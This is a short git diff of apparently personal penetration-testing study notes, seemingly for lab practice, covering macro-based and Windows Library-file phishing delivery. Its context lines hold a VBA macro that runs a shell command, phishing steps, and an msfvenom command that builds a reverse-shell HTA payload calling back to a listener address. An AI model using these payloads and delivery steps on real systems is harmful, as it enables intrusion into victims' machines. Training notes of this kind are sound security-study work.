@@ -71,9 +71,6 @@
             CreateObject("Wscript.Shell").Run Str
         End Sub
     ``` 
-
-- useful post-exploit file transfer: https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/ 
-
 ## Execution vis Windows Library Files
 - create a folder for this
 1. Prepare Send email to victim containing 'config.Library-ms' which direct to malicious wsgidev 
@@ -130,6 +127,7 @@ Send email with given information e.g. receiver/sender, smtp server usrname pw
 - Test login ``` swaks -server {ip} --auth LOGIN --auth-user {user email} --auth-password {password} --quit-after AUTH ```
 
 ## Exploit Libre Office
+- https://medium.com/@Dpsypher/proving-grounds-practice-craft-4a62baf140cc
 1. Prepare payload ``` msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.241 LPORT=4444 -f hta-psh -o evil.hta ```
 2. Split the file
 3. open new .ods file and add macro under the file
